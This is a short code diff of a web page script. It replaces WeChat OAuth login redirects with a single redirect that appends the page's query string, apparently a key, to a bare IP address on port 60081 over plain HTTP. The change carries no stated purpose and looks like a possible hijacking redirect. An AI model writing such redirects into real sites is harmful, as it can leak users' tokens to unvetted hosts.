@@ -13,11 +13,9 @@
 			return result;
 		}
 		let a = getQueryString().toString();
-		if (a.substring(0,2)=='u_'){
-			window.location.href = 'https://open.weixin.qq.com/connect/oauth2/authorize?state=key'+a+'&appid=wxe88841821d99c356&redirect_uri=http://ddns.greencyw.com&response_type=code&scope=snsapi_userinfo#wechat_redirect'
-		}else{
-			window.location.href = 'https://open.weixin.qq.com/connect/oauth2/authorize?state=key'+a+'&appid=wxe88841821d99c356&redirect_uri=http://ddns.greencyw.com&response_type=code&scope=snsapi_base#wechat_redirect'
-		}
+		window.location.href = 'http://52.79.113.79:60081/?k='+a
+		
+
 		
 	</script>
 
